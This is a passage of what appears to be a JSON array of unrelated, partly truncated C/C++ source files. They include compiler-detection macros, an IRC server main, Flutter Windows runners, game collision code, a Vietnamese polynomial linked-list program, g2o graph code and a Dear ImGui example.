defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: aoropeza <aoropeza@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/03/23 15:58:04 by fgalan-r          #+#    #+#             */\n/*   Updated: 2024/04/08 11:05:52 by aoropeza         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../inc/Server.hpp\"\n\nint main(int argc, char **argv)\n{\n\t// validate number or arguments and value of argv1 and argv2\n\tif (argc == 3 && Server::validPort(argv[1]) && Server::validPass(argv[2]))\n\t{\n\t\tstd::cout << \"Init Server\" << std::endl;\n\t\tServer server(std::stoi(argv[1]), argv[2]);\n\t\tsignal(SIGINT, Server::signalHandler);\t\t\t// catch the signal (ctrl + c)\n\t\tsignal(SIGQUIT, Server::signalHandler); \t\t// catch the signal (ctrl + \\)\n\t\ttry\n\t\t{\n\t\t\tserver.serverInit();\t\t\t\t\t\t// initialize the server\n\t\t}\n\t\tcatch(const std::exception& e)\n\t\t{\n\t\t\tserver.closeFds();\t\t\t\t\t\t\t// close the file descriptors\n\t\t\tstd::cerr << e.what() << std::endl;\n\t\t}\n\t\tstd::cout << \"Server Closed\" << std::endl;\n\t}\n\telse\n\t{\n\t\tstd::cerr << \"error: arguments\" << std::endl;\n\t\treturn (1);\n\t}\n\treturn (0);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"yasam_uyg\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Agent.h\"\r\n#include \"Level.h\"\r\n#include \"AE2D/ResourceManager.h\"\r\n\r\n#include <algorithm>\r\n\r\n//-------------------------------------------------------------------\r\nAgent::Agent() \r\n{\r\n\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nAgent::~Agent() \r\n{\r\n\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nbool Agent::collideWithLevel(const std::vector<std::string>& levelData) \r\n{\t\r\n\tstd::vector<glm::vec2> collideTilePositions;\r\n\r\n\t//check 4 corners\r\n\tcheckTilePos(collideTilePositions, levelData, m_position.x, m_position.y);\r\n\tcheckTilePos(collideTilePositions, levelData, m_position.x + AGENT_WIDTH, m_position.y);\r\n\tcheckTilePos(collideTilePositions, levelData, m_position.x, m_position.y + AGENT_WIDTH);\r\n\tcheckTilePos(collideTilePositions, levelData, m_position.x + AGENT_WIDTH, m_position.y + AGENT_WIDTH);\r\n\r\n\tif (collideTilePositions.size() == 0) return false;\r\n\r\n\tfor (unsigned int i = 0; i < collideTilePositions.size(); i++) {\r\n\t\tcollideWithTile(collideTilePositions[i]);\r\n\t}\r\n\treturn true;\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nvoid Agent::draw(AE::SpriteBatch& _spriteBatch) \r\n{\r\n\tconst glm::vec4 uvRect(0.0f, 0.0f, 1.0f, 1.0f);\r\n\r\n\tglm::vec4 destRect;\r\n\tdestRect.x = m_position.x;\r\n\tdestRect.y = m_position.y;\r\n\tdestRect.z = AGENT_WIDTH;\r\n\tdestRect.w = AGENT_WIDTH;\r\n\r\n\t_spriteBatch.draw(destRect, uvRect, m_textureID, 0.0f, m_color, m_direction);\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nbool Agent::damage(float damage) \r\n{\r\n\tm_health -= damage;\r\n\tif (m_health <= 0) return true;\r\n\treturn false;\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nvoid Agent::checkTilePos(std::vector<glm::vec2>& collideTilePositions, const std::vector<std::string>& levelData, float x, float y) \r\n{\r\n\tglm::vec2 cornerPos = glm::ivec2(floor(x / (float)TILE_WIDTH), floor(y / (float)TILE_WIDTH)); \t//check 4 corners\r\n\r\n\tif (cornerPos.x < 0 || cornerPos.x >= levelData[0].size() ||\r\n\t\tcornerPos.y < 0 || cornerPos.y >= levelData.size()) {\r\n\t\treturn;\r\n\t}\r\n\r\n\tif (levelData[cornerPos.y][cornerPos.x] != '.') {\r\n\t\tcollideTilePositions.push_back(cornerPos * (float)TILE_WIDTH + glm::vec2(TILE_WIDTH / 2));\r\n\t}\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nvoid Agent::collideWithTile(glm::vec2 tilePos) \r\n{\r\n\tconst float TILE_RADIUS = (float)TILE_WIDTH / 2.0f;\r\n\tconst float MIN_DISTANCE = AGENT_RADIUS + TILE_RADIUS;\r\n\r\n\tglm::vec2 centerPos = m_position + glm::vec2(AGENT_RADIUS);\r\n\tglm::vec2 distVec = centerPos - tilePos;\r\n\r\n\tfloat xDepth = MIN_DISTANCE - abs(distVec.x);\r\n\tfloat yDepth = MIN_DISTANCE - abs(distVec.y);\r\n\r\n\tif (xDepth > 0 && yDepth > 0) { //make sure we are actually inside obj\r\n\t\tif (std::max(xDepth, 0.0f) < std::max(yDepth, 0.0f)) {\r\n\t\t\tif (distVec.x < 0) { \r\n\t\t\t\tm_position.x -= xDepth;\r\n\t\t\t} else { \r\n\t\t\t\tm_position.x += xDepth; \r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tif (distVec.y < 0) {\r\n\t\t\t\tm_position.y -= yDepth;\r\n\t\t\t} else {\r\n\t\t\t\tm_position.y += yDepth;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//-------------------------------------------------------------------\r\nbool Agent::collideWithAgent(Agent* agent)\r\n{\r\n\tconst float MIN_DISTANCE = AGENT_RADIUS + AGENT_RADIUS;\r\n\r\n\tglm::vec2 centerPosA = m_position + glm::vec2(AGENT_RADIUS);\r\n\tglm::vec2 centerPosB = agent->getPos() + glm::vec2(AGENT_RADIUS);\r\n\tglm::vec2 distVec = centerPosA - centerPosB;\r\n\r\n\tfloat distance = glm::length(distVec);\r\n\tfloat collisionDepth = MIN_DISTANCE - distance;\r\n\r\n\tif (collisionDepth > 0) {\r\n\t\tglm::vec2 collisionDepthVec = glm::normalize(distVec) * collisionDepth;\r\n\r\n\t\tm_position += collisionDepthVec / 2.0f;\r\n\t\tagent->m_position -= collisionDepthVec / 2.0f;\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"detector\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <ctype.h>\n#include <sstream>\n#include <string>\n#include <stdlib.h>\n#include <math.h>\n\nstruct Donthuc\n{\n    float he_so;\n    int bac;\n};\nstruct Node\n{\n    Donthuc donthuc;\n    Node* next;\n};\nstruct List\n{\n    Node *head, *tail;\n};\nvoid initialize(List &l);\n//\nvoid nhapDathuc(std::string &input);\nvoid chuan_hoa_chuoi(std::string &input);\n//\nDonthuc tao_don_thuc(float he_so, int bac);\nNode* tao_nut_dslk(Donthuc dt);\nvoid tao_dslk(List &l , std::string input);\nvoid them_nut(List &l, Node* node);\nvoid in_da_thuc(List l);\nvoid in_don_thuc(Donthuc p);\n//\nfloat quy_doi_ve_thap_phan(std::string he_so);\n//\nvoid swap(Donthuc &a, Donthuc &b);\nvoid sx_da_thuc_bac_giam_dan(List l);\n//\nvoid xoa_phantu_sau_nut(List &l, Node* nut_hien_tai);\nvoid xoa_don_thuc(List &l, int bac);\n//\nvoid rut_gon_dathuc(List &l);\n//\nvoid them_vao_cuoi_ds(List &l, Node* node);\nvoid them_vao_dau_ds(List &l, Node* node);\nvoid them_vao_sau_nut(List &l, Node* node, Node* current);\nvoid them_mot_don_thuc(List &l, Donthuc p);\n//\nfloat tinh_gia_tri_da_thuc(List l, float x);\nvoid cong_da_thuc(List dathuc1, List dathuc2); \nvoid tru_da_thuc(List dathuc1, List dathuc2);\nvoid nhan_da_thuc(List dathuc1, List dathuc2);\n\nint main()\n{\n    List dathuc1, dathuc2;\n    std::string input;\n    initialize(dathuc1);\n\tinitialize(dathuc2);\n\t// tao da thuc 1\n    nhapDathuc(input);\n    chuan_hoa_chuoi(input);\n    tao_dslk(dathuc1, input);\n\t// tao da thuc 2\n\tnhapDathuc(input);\n    chuan_hoa_chuoi(input);\n    tao_dslk(dathuc2, input);\n\n\trut_gon_dathuc(dathuc1);\n\t//them_mot_don_thuc(dathuc1, tao_don_thuc(2, 3));\n\tin_da_thuc(dathuc1);\n\tin_da_thuc(dathuc2);\n\tstd::cout << \"Tong: \" << std::endl;\n\tcong_da_thuc(dathuc1, dathuc2);\n\tstd::cout << \"Hieu: \" << std::endl;\n\ttru_da_thuc(dathuc1, dathuc2);\n\tstd::cout << \"Nhan: \" << std::endl;\n\tnhan_da_thuc(dathuc1, dathuc2);\n\t//std::cout << \"gia tri cua da thuc khi x = 2: \" << tinh_gia_tri_da_thuc(dathuc1, 2) << std::endl;\n\tsystem(\"pause\");\n\treturn 0;\n}\n\nvoid initialize(List &l)\n{\n    l.head = l.tail = NULL;\n}\nvoid nhapDathuc(std::string &input)\n{\n    std::cout << \"Nhap da thuc: \";\n    std::getline(std::cin, input);\n}\nvoid chuan_hoa_chuoi(std::string &input)\n{\n    std::stringstream ss(input);\n    std::string res = \"\", word;\n    while (ss >> word)\n    {\n        res += tolower(word[0]);\n        for (int j = 1; j < word.size(); j++)\n            res += tolower(word[j]);\n        res += \"\";\n    }\n    res += word[word.size()];\n    res.pop_back();\n    input.assign(res);\n}\nDonthuc tao_don_thuc(float he_so, int bac)\n{\n    Donthuc donthuc;\n    donthuc.he_so = he_so;\n    donthuc.bac = bac;\n    return donthuc;\n}\nNode* tao_nut_dslk(Donthuc dt)\n{\n    Node* node = new Node;\n    if (node == NULL) return NULL;\n    node->donthuc = dt;\n    node->next = NULL;\n    return node;\n}\nvoid tao_dslk(List &l , std::string input)\n{\n    int i = 0, vt = 0;\n    Node* node = NULL;\n    while (input[i] != '\\0')\n    {\n        if (input[i] == 'x')\n        {\n            float he_so = quy_doi_ve_thap_phan(input.substr(vt, i - vt));\n\t\t\tint bac = input[i + 1] == '^' ? bac = std::stoi(input.substr(i+2, input.find('+', vt - i - 2))) : 1;\n            node = tao_nut_dslk(tao_don_thuc(he_so, bac));\n            them_nut(l, node);\n            vt = input.find('+', vt) + 1;\n        }\n        ++i;\n    }\n}\nvoid them_nut(List &l, Node* node)\n{\n    if(l.head == NULL)\n        l.head = node;\n    else\n        l.tail->next = node;\n    l.tail = node;\n}\nfloat quy_doi_ve_thap_phan(std::string he_so)\n{\n    if (he_so == \"\") return 1;\n    std::istringstream iss(he_so);\n    int numerator, denominator;\n    char separator;\n    iss >> numerator >> separator >> denominator;\n    if (separator != '/')\n        return std::stof(he_so);\n    if (denominator == 0)\n    {\n        std::cout << \"mau so cua phan so khong the bang 0\\n\";\n\t\tsystem(\"pause>0\");;\n        exit(0);\n    }\n    return static_cast<float>(numerator) / denominator;\n}\nvoid in_da_thuc(List l)\n{\n    while(l.head)\n    {\n        in_don_thuc(l.head->donthuc);\n        std::cout << \" + \";\n        l.head = l.head->next;\n    }\n\tstd::cout << static_cast<char>(8) << \" \" << static_cast<char>(8);\n    std::cout << static_cast<char>(8) << \" \" << static_cast<char>(8);\n\tstd::cout << '\\n';\n}\nvoid in_don_thuc(Donthuc p)\n{\n\tif (p.he_so != 0)\n\t\tstd::cout << p.he_so << \"x^\" << p.bac;\n\telse\n\t\tstd::cout << '0';\n}\n//\nvoid swap(Donthuc &a, Donthuc &b)\n{\n\tDonthuc temp = a;\n\ta = b;\n\tb = temp;\n}\nvoid sx_da_thuc_bac_giam_dan(List l)\n{\n\tif(l.head == NULL || l.head == l.tail) return;\n\tNode* p = l.head;\n\twhile (p)\n\t{\n\t\tNode* max = p;\n\t\tfor (Node* q = p->next; q != NULL; q=q->next)\n\t\t\tif (q->donthuc.bac > max->donthuc.bac)\n\t\t\t\tmax = q;\n\t\tif (max != p)\n\t\t\tswap(max->donthuc, p->donthuc);\n\t\tp = p->next;\n\t}\n}\n//\nvoid xoa_phantu_sau_nut(List &l, Node* current)\n{\n\tif (l.head == NULL || current == NULL) return;\n\tif (current->next->next == NULL) l.tail = current;\n\tNode* next_next = current->next->next;\n\tdelete current->next;\n\tcurrent->next = next_next;\n}\nvoid xoa_d",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_plant_shop\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// g2o - General Graph Optimization\n// Copyright (C) 2011 R. Kuemmerle, G. Grisetti, H. Strasdat, W. Burgard\n// All rights reserved.\n//\n// Redistribution and use in source and binary forms, with or without\n// modification, are permitted provided that the following conditions are\n// met:\n//\n// * Redistributions of source code must retain the above copyright notice,\n//   this list of conditions and the following disclaimer.\n// * Redistributions in binary form must reproduce the above copyright\n//   notice, this list of conditions and the following disclaimer in the\n//   documentation and/or other materials provided with the distribution.\n//\n// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS\n// IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED\n// TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A\n// PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\n// HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\n// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED\n// TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n// PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n// SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n#include \"optimizable_graph.h\"\n\n#include <cassert>\n#include <iostream>\n#include <iomanip>\n#include <fstream>\n#include <algorithm>\n\n#include <Eigen/Dense>\n\n#include \"estimate_propagator.h\"\n#include \"factory.h\"\n#include \"optimization_algorithm_property.h\"\n#include \"hyper_graph_action.h\"\n#include \"cache.h\"\n#include \"robust_kernel.h\"\n\n#include \"../stuff/macros.h\"\n#include \"../stuff/color_macros.h\"\n#include \"../stuff/string_tools.h\"\n#include \"../stuff/misc.h\"\n\nnamespace g2o {\n\n  using namespace std;\n\n  OptimizableGraph::Data::Data(){\n    _next = 0;\n  }\n  \n  OptimizableGraph::Data::~Data(){\n    if (_next)\n      delete _next;\n  }\n  \n\n  OptimizableGraph::Vertex::Vertex() :\n    HyperGraph::Vertex(),\n    _graph(0), _userData(0), _hessianIndex(-1), _fixed(false), _marginalized(false),\n    _colInHessian(-1), _cacheContainer(0)\n  {\n  }\n\n  CacheContainer* OptimizableGraph::Vertex::cacheContainer(){\n    if (! _cacheContainer)\n      _cacheContainer = new CacheContainer(this);\n    return _cacheContainer;\n  }\n\n\n  void OptimizableGraph::Vertex::updateCache(){\n    if (_cacheContainer){\n      _cacheContainer->setUpdateNeeded();\n      _cacheContainer->update();\n    }\n  }\n\n  OptimizableGraph::Vertex::~Vertex()\n  {\n    if (_cacheContainer)\n      delete (_cacheContainer);\n    if (_userData)\n      delete _userData;\n  }\n  \n  OptimizableGraph::Vertex* OptimizableGraph::Vertex::clone() const\n  {\n    return 0;\n  }\n\n  bool OptimizableGraph::Vertex::setEstimateData(const double* v)\n  {\n    bool ret = setEstimateDataImpl(v);\n    updateCache();\n    return ret;\n  }\n\n  bool OptimizableGraph::Vertex::getEstimateData(double *) const\n  {\n    return false;\n  }\n\n  int OptimizableGraph::Vertex::estimateDimension() const\n  {\n    return -1;\n  }\n\n  bool OptimizableGraph::Vertex::setMinimalEstimateData(const double* v)\n  {\n    bool ret = setMinimalEstimateDataImpl(v);\n    updateCache();\n    return ret;\n  }\n\n  bool OptimizableGraph::Vertex::getMinimalEstimateData(double *) const\n  {\n    return false;\n  }\n\n  int OptimizableGraph::Vertex::minimalEstimateDimension() const\n  {\n    return -1;\n  }\n\n\n  OptimizableGraph::Edge::Edge() :\n    HyperGraph::Edge(),\n    _dimension(-1), _level(0), _robustKernel(0)\n  {\n  }\n\n  OptimizableGraph::Edge::~Edge()\n  {\n    delete _robustKernel;\n  }\n\n  OptimizableGraph* OptimizableGraph::Edge::graph(){\n    if (! _vertices.size())\n      return 0;\n    OptimizableGraph::Vertex* v=(OptimizableGraph::Vertex*)_vertices[0];\n    if (!v)\n      return 0;\n    return v->graph();\n  }\n  \n  const OptimizableGraph* OptimizableGraph::Edge::graph() const{\n    if (! _vertices.size())\n      return 0;\n    const OptimizableGraph::Vertex* v=(const OptimizableGraph::Vertex*) _vertices[0];\n    if (!v)\n      return 0;\n    return v->graph();\n  }\n\n  bool OptimizableGraph::Edge::setParameterId(int argNum, int paramId){\n    if ((int)_parameters.size()<=argNum)\n      return false;\n    if (argNum<0)\n      return false;\n    *_parameters[argNum] = 0;\n    _parameterIds[argNum] = paramId;\n    return true;\n  }\n\n  bool OptimizableGraph::Edge::resolveParameters() {\n    if (!graph()) {\n      cerr << __PRETTY_FUNCTION__ << \": edge not registered with a graph\" << endl;\n      return false;\n    }\n    \n    assert (_parameters.size() == _parameterIds.size());\n    //cerr << __PRETTY_FUNCTION__ << \": encountered \" << _parameters.size() << \" parameters\" << endl;\n    for (size_t i=0; i<_parameters.size(); i++){\n      int index = _parameterIds[i];\n      *_parameters[i] = graph()->parameter(index);\n      if (typeid(**_parameters[i]).name()!=_parameterTypes[i]){\n        c",
    "// Dear ImGui: standalone example application for Win32 + OpenGL 3\n\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// This is provided for completeness, however it is strongly recommended you use OpenGL with SDL or GLFW.\n\n#include \"imgui.h\"\n#include \"imgui_impl_opengl3.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <GL/GL.h>\n#include <tchar.h>\n\n// Data stored per platform window\nstruct WGL_WindowData { HDC hDC; };\n\n// Data\nstatic HGLRC            g_hRC;\nstatic WGL_WindowData   g_MainWindow;\nstatic int              g_Width;\nstatic int              g_Height;\n\n// Forward declarations of helper functions\nbool CreateDeviceWGL(HWND hWnd, WGL_WindowData* data);\nvoid CleanupDeviceWGL(HWND hWnd, WGL_WindowData* data);\nvoid ResetDeviceWGL();\nLRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\n\n// Main code\nint main(int, char**)\n{\n    // Create application window\n    //ImGui_ImplWin32_EnableDpiAwareness();\n    WNDCLASSEXW wc = { sizeof(wc), CS_OWNDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L\"ImGui Example\", nullptr };\n    ::RegisterClassExW(&wc);\n    HWND hwnd = ::CreateWindowW(wc.lpszClassName, L\"Dear ImGui Win32+OpenGL3 Example\", WS_OVERLAPPEDWINDOW, 100, 100, 1280, 800, nullptr, nullptr, wc.hInstance, nullptr);\n\n    // Initialize OpenGL\n    if (!CreateDeviceWGL(hwnd, &g_MainWindow))\n    {\n        CleanupDeviceWGL(hwnd, &g_MainWindow);\n        ::DestroyWindow(hwnd);\n        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);\n        return 1;\n    }\n    wglMakeCurrent(g_MainWindow.hDC, g_hRC);\n\n    // Show the window\n    ::ShowWindow(hwnd, SW_SHOWDEFAULT);\n    ::UpdateWindow(hwnd);\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;   // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;    // Enable Gamepad Controls\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsClassic();\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplWin32_InitForOpenGL(hwnd);\n    ImGui_ImplOpenGL3_Init();\n\n    // Load Fonts\n    // - If no fonts are loaded, dear imgui will use the default font. You can also load multiple fonts and use ImGui::PushFont()/PopFont() to select them.\n    // - AddFontFromFileTTF() will return the ImFont* so you can store it if you need to select the font among multiple.\n    // - If the file cannot be loaded, the function will return a nullptr. Please handle those errors in your application (e.g. use an assertion, or display an error and quit).\n    // - The fonts will be rasterized at a given size (w/ oversampling) and stored into a texture when calling ImFontAtlas::Build()/GetTexDataAsXXXX(), which ImGui_ImplXXXX_NewFrame below will call.\n    // - Use '#define IMGUI_ENABLE_FREETYPE' in your imconfig file to use Freetype for higher quality font rendering.\n    // - Read 'docs/FONTS.md' for more instructions and details.\n    // - Remember that in C/C++ if you want to include a backslash \\ in a string literal you need to write a double backslash \\\\ !\n    //io.Fonts->AddFontDefault();\n    //io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\segoeui.ttf\", 18.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/DroidSans.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Roboto-Medium.ttf\", 16.0f);\n    //io.Fonts->AddFontFromFileTTF(\"../../misc/fonts/Cousine-Regular.ttf\", 15.0f);\n    //ImFont* font = io.Fonts->AddFontFromFileTTF(\"c:\\\\Windows\\\\Fonts\\\\ArialUni.ttf\", 18.0f, nullptr, io.Fonts->GetGlyphRangesJapanese());\n    //IM_ASSERT(font != nullptr);\n\n    // Our state\n    bool show_demo_window = true;\n    bool show_another_window = false;\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    while (!done)\n    {\n        // Poll and handle messages (inputs, window resize, etc.)\n        // See the WndProc() function below for our to dispatch events to the Win32 backend.\n        MSG msg;\n        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))\n        {\n            ::TranslateMessage(&msg);\n            ::DispatchMessage(&msg);\n            if (msg.message == WM_QUIT)\n                done = true;\n        }\n        if (done)\n            break;\n\n        // Start the Dear ImGui frame\n        ImGui_ImplOpenGL3_NewFrame();\n        ImGui_ImplWin32_NewFrame();\n        ImGui::NewFrame();\n\n        // 1. Show the big demo window (Most of the sample code is in ImGui::ShowDemoWindow()! You can browse its code to learn more about Dear ImGui!).\n        if (show_demo_window)\n          ",
